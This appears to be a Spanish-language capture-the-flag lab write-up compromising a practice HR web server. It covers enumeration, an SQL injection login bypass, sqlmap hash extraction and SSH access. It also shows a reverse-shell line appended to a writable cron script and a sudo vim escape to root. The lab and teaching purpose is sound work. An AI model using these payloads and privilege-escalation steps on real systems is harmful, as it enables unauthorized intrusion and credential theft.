
### Fase de Reconocimiento y Descubrimiento (Enumeración)

#### Escaneo de Puertos (Nmap)

Realizamos un escaneo de puertos inicial con nmap para identificar los servicios activos:

![[Pasted image 20260706234447.png]]

**Servicios identificados:**

* **Puerto 22/TCP (SSH):** Puerto abierto para control remoto. Ver teoría en [SSH.md](<../../../Pentesting Notes/1_Enumeration/SSH.md>).
* **Puerto 80/TCP (HTTP):** Servidor web expuesto. Ver teoría en [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>).

***

### Enumeración Web

#### Inspección del Servidor Web (WhatWeb)

Evaluamos el sitio web utilizando la herramienta whatweb:

```bash
whatweb http://172.17.0.2
```

![[Pasted image 20260706234536.png]]

La herramienta reporta las tecnologías básicas (Apache 2.4.62) y la presencia de un campo de contraseña. Se identifica la cabecera poco común `X-Virtual-Host` que apunta a `gatekeeperhr.com`.

#### Configuración de Virtual Hosting

Dado que el servidor web utiliza virtual hosting para redirigir las peticiones basadas en el nombre del dominio, agregamos la entrada correspondiente en nuestro archivo local `/etc/hosts`:

```
172.17.0.2  gatekeeperhr.com
```

#### Inspección Web y Bypass de Autenticación (SQLi)

Accedemos a la página web en el navegador a través de `http://gatekeeperhr.com`:

![[Pasted image 20260707001415.png]]

El sitio web corresponde a un portal de recursos humanos ("GateKeeper HR"). En la sección de contactos observamos el posible usuario `mariana`.

Accedemos al formulario de inicio de sesión y realizamos una inyección SQL clásica para evadir la autenticación del portal (login bypass):

```sql
admin' or 1=1 -- -
```

![[Pasted image 20260707001527.png]]

El bypass funciona y nos permite ingresar con éxito al panel interno, listando a todos los empleados del sistema:

![[Pasted image 20260706234632.png]]

![[Pasted image 20260707001607.png]]

Al inspeccionar el código fuente HTML de la página web principal, encontramos un comentario de los administradores que indica la necesidad de remover los accesos por SSH a los pasantes del sistema, mencionando específicamente a `valentina` y `pedro`:

![[Pasted image 20260707001551.png]]

#### Fuzzing de Directorios y Desofuscación ROT13

Realizamos fuzzing sobre el dominio en busca de directorios adicionales:

![[Pasted image 20260707002014.png]]

* **Hallazgo:** Identificamos un directorio `/lab/`. Realizamos fuzzing interno sobre este y encontramos el recurso `employees.php`:

![[Pasted image 20260707002059.png]]

* **Hallazgo:** En `employees.php` se muestra el mismo listado de empleados:

![[Pasted image 20260707002130.png]]

Para extraer la estructura y los hashes de la base de datos, ejecutamos sqlmap contra el endpoint vulnerable:

![[Pasted image 20260707004051.png]]

Extrayendo las tablas de la base de datos `users`:

![[Pasted image 20260707010555.png]]

La tabla `hr_users` contiene credenciales hasheadas de los administradores:

```
mariana:0571749e2ac330a7455809c6b0e7af90
jorge:d8578edf8458ce06fbc5bb76a58c5ca4
```

Continuamos con el fuzzing de la web e identificamos un directorio llamado `/spam/` que contiene un archivo `index.html`:

![[Pasted image 20260707231811.png]]

Al analizar el código fuente de `/spam/index.html`, encontramos el siguiente comentario oculto:

```html
<!-- Yn pbagenfrñn qr hab qr ybf cnfnagrf rf 'checy3' -->
```

* **Desofuscación:** La cadena está codificada en ROT13. Al decodificarla, obtenemos el siguiente texto: `La contraseaa de uno de los pasantes es 'purpl3'`

***

### Fase de Explotación / Intrusión

#### Acceso Inicial por SSH

Probamos las credenciales decodificadas (`purpl3`) contra las cuentas de los pasantes identificadas previamente (`pedro` y `valentina`).

Establecemos con éxito una sesión vía SSH con el usuario `pedro`:

```bash
ssh pedro@172.17.0.2
```

![[Pasted image 20260710181755.png]]

***

### Escalada de Privilegios

#### 1. Pivotaje de Usuario (`pedro` a `valentina`)

Durante la enumeración del sistema de archivos con el usuario `pedro`, localizamos un script en `/opt/` que se ejecuta de forma periódica mediante una tarea cron (cronjob) con los privilegios del usuario `valentina`:

![[Pasted image 20260710183416.png]]

Dado que el usuario `pedro` cuenta con permisos de escritura sobre este script, añadimos una línea de comandos para que ejecute una shell inversa de vuelta a nuestra máquina atacante:

```bash
echo 'bash -c "bash -i >& /dev/tcp/172.17.0.1/4242 0>&1"' >> /opt/.clean.sh
```

Nos ponemos en escucha en nuestra máquina local y, tras cumplirse el intervalo de ejecución programado, recibimos la conexión como el usuario `valentina`:

![[Pasted image 20260710183501.png]]

#### 2. Esteganografía y Extracción de Clave (`valentina` a `root`)

En el directorio personal del usuario `valentina`, localizamos una imagen. Transferimos la imagen a nuestra máquina atacante para realizar un análisis esteganográfico.

Haciendo uso de la herramienta steghide, intentamos extraer información oculta dentro de la imagen sin necesidad de contraseña:

```bash
steghide extract -sf imagen.jpg
```

![[Pasted image 20260711111847.png]]

![[Pasted image 20260711112229.png]]

* **Resultado:** Se extrae exitosamente un archivo llamado `secret.txt` que contiene la cadena `mag1ck`.

Utilizamos la clave obtenida (`mag1ck`) para iniciar sesión con la cuenta de `valentina` o cambiar el contexto de usuario en la terminal:

![[Pasted image 20260711112410.png]]

#### 3. Explotación de Sudoers (Vim)

Listamos los comandos que el usuario `valentina` puede ejecutar con privilegios de superusuario:

```bash
sudo -l
```

* **Vulnerabilidad de Configuración:** El usuario `valentina` puede ejecutar el editor de texto `/usr/bin/vim` como `root` sin ingresar contraseña (NOPASSWD). Ver teoría en [Permissions.md](<../../../Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions.md>).

Aprovechamos los privilegios de ejecución de vim para invocar una shell de sistema:

```bash
sudo /usr/bin/vim
```

Una vez abierto el editor, introducimos el siguiente comando de escape:

```
:!bash
```

![[Pasted image 20260711112711.png]]

¡Obtenemos con éxito una consola interactiva como el usuario root con control total del servidor!

***

### Relaciones y Conceptos

* **Teoría:** [Linux Privilege Escalation - Permissions.md](<../../../Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions.md>), [SQL Injection Cheat Sheet](<../../../Pentesting Notes/Web/Vulnerabilities/01-SQL_Injection/Cheat Sheet.md>), [SSH.md](<../../../Pentesting Notes/1_Enumeration/SSH.md>), [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>)
* **Laboratorios Relacionados:** [Obsession](../MuyFacil/Obsession.md) (Comparte escalada por vim), [Trust](../MuyFacil/Trust.md) (Comparte escalada por vim)
